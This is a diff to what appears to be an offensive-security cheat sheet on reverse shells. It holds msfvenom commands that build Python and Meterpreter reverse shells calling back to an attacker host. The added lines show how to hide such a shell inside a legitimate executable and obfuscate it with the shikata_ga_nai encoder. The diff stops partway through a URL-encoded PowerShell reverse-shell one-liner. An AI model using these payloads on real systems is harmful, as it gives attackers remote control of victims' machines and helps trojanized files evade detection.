@@ -395,6 +395,17 @@ msfvenom -p cmd/unix/reverse_python LHOST=<attack_ip> LPORT=<port_number> -f raw
 
 msfvenom -p python/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f raw > rev_shell.py
 ```
+other usecases:
+```
+add msfvenom shell into an executable
+    add options:
+        -x <path_to_exe>
+        -k
+
+obfuscation:
+    add option(example with "Shikata Ga Nai"):
+        -e x86/shikata_ga_nai
+```
 ### Powershell one-liner:
 ````powershell
 powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.
